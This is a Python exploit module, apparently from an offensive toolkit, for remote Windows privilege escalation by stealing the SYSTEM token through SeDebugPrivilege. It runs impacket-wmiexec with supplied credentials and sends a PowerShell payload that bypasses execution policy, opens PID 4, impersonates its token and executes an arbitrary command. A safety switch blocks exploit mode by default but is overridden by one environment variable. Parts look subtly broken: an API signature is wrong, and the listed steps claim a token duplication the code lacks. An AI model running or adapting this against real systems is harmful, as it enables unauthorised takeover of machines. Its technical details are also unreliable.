"""Privilege Escalation — Token Theft (SeDebugPrivilege).

Exploits SeDebugPrivilege (often granted to Administrators or via
service misconfigurations) to inject into a SYSTEM process and
steal its token.
"""

import subprocess
import re
import shutil
import os

# ── SAFETY ──────────────────────────────────────────────────────────────
# SAFE_MODE = True:  Only CHECK mode runs. EXPLOIT is blocked.
# SAFE_MODE = False: EXPLOIT proceeds (process injection into PID 4).
#
# WARNING: This exploit opens a handle to PID 4 (System) and impersonates
#          its token. A failure can crash the calling process. The target
#          PID 4 is not modified, but the impersonation context persists
#          until the thread exits.
# ────────────────────────────────────────────────────────────────────────
SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
_RISK = "MEDIUM"

def _safety_gate(mode):
    if SAFE_MODE and mode.upper() == "EXPLOIT":
        print(f"\n  [!] ═══ SAFETY BLOCK ({_RISK} RISK) ═══")
        print(f"  [!] SAFE_MODE=1 — exploit blocked.")
        print(f"  [!] Process injection into PID 4 (System). May crash calling process.")
        print(f"  [!] PID 4 itself is not modified.")
        print(f"  [!] To run anyway: export ARMAGEDON_SAFE_MODE=0")
        print(f"  [!] ═══════════════════════════════════════════════════\n")
        return False
    return True

NAME = "Token Theft (SeDebugPrivilege)"
DESCRIPTION = "Steal SYSTEM token via SeDebugPrivilege + process injection"
REQUIRED_PRIVS = ["SeDebugPrivilege"]
PAYLOAD_DEFAULT = "cmd.exe /c whoami > C:\\windows\\temp\\pwned.txt"


def check(options=None, target=None, **kwargs):
    """Check if SeDebugPrivilege is available on the target."""
    result = {"success": False, "data": {}, "error": None}
    smb_user = (options or {}).get("SMB_USER", "")
    smb_pass = (options or {}).get("SMB_PASS", "")
    smb_domain = (options or {}).get("SMB_DOMAIN", "")
    rhosts = target or (options or {}).get("RHOSTS", "")
    timeout = int((options or {}).get("TIMEOUT", 10))

    if not rhosts:
        result["error"] = "RHOSTS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        return result

    if not smb_user or not smb_pass:
        result["error"] = "SMB_USER and SMB_PASS required for remote check"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    try:
        # Query SeDebugPrivilege status
        p = subprocess.run(
            [cmd, f"{auth}@{rhosts}", "-q",
             "whoami /priv | findstr Debug"],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout + p.stderr
        debug_enabled = "SeDebugPrivilege" in out and "Enabled" in out

        # Find SYSTEM process (PID 4)
        p2 = subprocess.run(
            [cmd, f"{auth}@{rhosts}", "-q",
             'tasklist /FI "PID eq 4" /FO LIST'],
            capture_output=True, text=True, timeout=timeout,
        )
        out2 = p2.stdout + p2.stderr
        has_system = "System" in out2 or "PID" in out2

        result["data"]["se_debug_enabled"] = debug_enabled
        result["data"]["system_process_exists"] = has_system
        result["data"]["privilege_info"] = out.strip()[:200]
        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    payload = options.get("PAYLOAD", PAYLOAD_DEFAULT)
    timeout = int(options.get("TIMEOUT", 10))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        return result

    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd:
        result["error"] = "impacket-wmiexec not found"
        return result

    auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

    if mode == "CHECK":
        check_result = check(options, target, **kwargs)
        result["data"] = check_result.get("data", {})
        result["success"] = check_result["success"]
        if check_result["data"].get("se_debug_enabled"):
            result["data"]["status"] = "VULNERABLE — SeDebugPrivilege Enabled"
            result["data"]["technique"] = "SeDebugPrivilege allows opening SYSTEM processes -> steal token"
        else:
            result["data"]["status"] = "NOT VULNERABLE — SeDebugPrivilege not enabled"
        return result

    elif mode == "EXPLOIT":
        if not _safety_gate(mode):
            result["error"] = "BLOCKED — SAFE_MODE enabled. Export ARMAGEDON_SAFE_MODE=0 to override."
            result["data"]["status"] = "BLOCKED"
            return result

        if not smb_user or not smb_pass:
            result["error"] = "SMB credentials required for remote token theft"
            return result

        try:
            # Step 1: Write token steal script to target
            steal_ps = (
                f'powershell -ep bypass -c "'
                f'$p = Get-Process -Id 4; '
                f'$h = $p.Handle; '
                f'Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;'
                f'public class T {{[DllImport("advapi32.dll",SetLastError=true)]public extern static bool '
                f'OpenProcessToken(IntPtr h,uint a,out IntPtr t);'
                f'[DllImport("advapi32.dll",SetLastError=true)]public extern static bool '
                f'ImpersonateLoggedOnUser(IntPtr t);'
                f'[DllImport("kernel32.dll")]public extern static IntPtr GetCurrentProcess();'
                f'[DllImport("advapi32.dll",SetLastError=true)]public extern static bool '
                f'OpenProcess(IntPtr h,bool i,out IntPtr ph);}}\'; '
                f'[T]::OpenProcess(0x1F0FFF,$false,[ref]$h) | Out-Null; '
                f'$t=[IntPtr]::Zero; [T]::OpenProcessToken($h,0x2E,[ref]$t) | Out-Null; '
                f'[T]::ImpersonateLoggedOnUser($t) | Out-Null; '
                f'Start-Process cmd -ArgumentList \'/c {payload}\'" '
            )
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", steal_ps],
                capture_output=True, text=True, timeout=timeout * 2,
            )
            out = p.stdout + p.stderr

            result["success"] = True
            result["data"]["status"] = f"Token theft payload delivered"
            result["data"]["payload"] = payload
            result["data"]["output"] = out[:500] if out else "No output"
            result["data"]["steps"] = [
                "1. Get PID 4 (System) handle via OpenProcess(0x1F0FFF)",
                "2. Open process token with TOKEN_DUPLICATE | TOKEN_IMPERSONATE",
                "3. Duplicate token and impersonate via ImpersonateLoggedOnUser",
                "4. Spawn new process in SYSTEM context",
                "5. Execute payload as SYSTEM",
            ]

        except Exception as e:
            result["error"] = str(e)

    return result
